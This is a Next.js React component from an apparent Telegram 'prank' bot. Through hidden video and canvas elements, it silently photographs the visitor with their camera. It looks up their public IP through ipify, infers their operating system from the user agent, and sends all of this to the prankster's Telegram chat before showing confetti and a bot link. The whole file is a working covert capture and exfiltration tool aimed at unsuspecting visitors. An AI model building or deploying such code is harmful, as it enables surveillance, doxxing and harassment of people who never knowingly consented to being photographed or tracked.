"use client";

import confetti from "canvas-confetti";
import { ArrowUpRight } from "lucide-react";
import { useTranslations } from "next-intl";
import { useCallback, useEffect, useState } from "react";
import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
import { useCamera } from "../_hooks/use-camera";
import { Loader } from "./loader";

async function getUserIp() {
	return fetch("https://api.ipify.org/?format=json")
		.then((res) => res.json())
		.then((data) => data.ip)
		.catch(() => "unknown");
}

function getUserDevice() {
	const userAgent = navigator.userAgent;

	if (/Windows/.test(userAgent)) {
		return "Windows";
	}

	if (/Macintosh/.test(userAgent)) {
		return "MacOS";
	}

	if (/Android/.test(userAgent)) {
		return "Android";
	}

	if (/iPhone/.test(userAgent)) {
		return "iPhone";
	}

	if (/iPad/.test(userAgent)) {
		return "iPad";
	}

	if (/CrOS/.test(userAgent)) {
		return "ChromeOS";
	}

	if (/Linux/.test(userAgent)) {
		return "Linux";
	}

	return "unknown";
}

interface CameraProps {
	chatId: number;
}

type DescriptionTextTranslationKeys = Extract<keyof IntlMessages["prank"], "subtitle" | "description">;

const DescriptionText = ({ translationKey }: { translationKey: DescriptionTextTranslationKeys }) => {
	const t = useTranslations("prank");

	return (
		<p className="text-lg">
			{t.rich(translationKey, {
				botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`,
				a: (content) => (
					<a
						className="hover:text-orange-500 transition duration-200"
						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
						target="_blank"
						rel="noreferrer"
					>
						{content}
					</a>
				),
				u: (content) => <span className="underline underline-offset-4">{content}</span>
			})}
		</p>
	);
};

export const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();
	const [isTakingPhoto, setIsTakingPhoto] = useState(true);
	const t = useTranslations("prank");

	const handlePhoto = useCallback(
		async (_photo: string) => {
			const ip = await getUserIp();
			const device = getUserDevice();
			await sendPhotoToChat({ photo: _photo, chatId, ip, device });

			setIsTakingPhoto(false);
			confetti({
				particleCount: 500,
				spread: 90,
				origin: { y: 1 },
				scalar: 2,
				startVelocity: 80,
				ticks: 500
			});
		},
		[chatId]
	);

	useEffect(() => {
		if (!photo) return;

		handlePhoto(photo);
	}, [photo, handlePhoto]);

	return (
		<>
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas className="hidden" ref={canvasRef} />
			{!isTakingPhoto ? (
				<div className="flex flex-col justify-center items-center gap-8 w-full md:w-1/2 bg-neutral-900 px-6 py-12 md:p-12 rounded-2xl">
					<h1 className="text-3xl font-bold">{t("title")}</h1>
					<div className="space-y-4">
						<DescriptionText translationKey="subtitle" />
						<DescriptionText translationKey="description" />
					</div>
					<a
						className="relative px-6 py-3 rounded-lg text-center bg-neutral-600 hover:bg-neutral-500 transition duration-200 text-white"
						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
						rel="noreferrer noopener"
						target="_blank"
					>
						{t("button")}
						<ArrowUpRight className="absolute top-0.5 right-0.5 size-4" />
					</a>
				</div>
			) : (
				<Loader />
			)}
		</>
	);
};

export const CameraNotAllowed = () => {
	const t = useTranslations("common");

	return <h1 className="font-bold text-4xl">{t("camera-not-allowed")}</h1>;
};
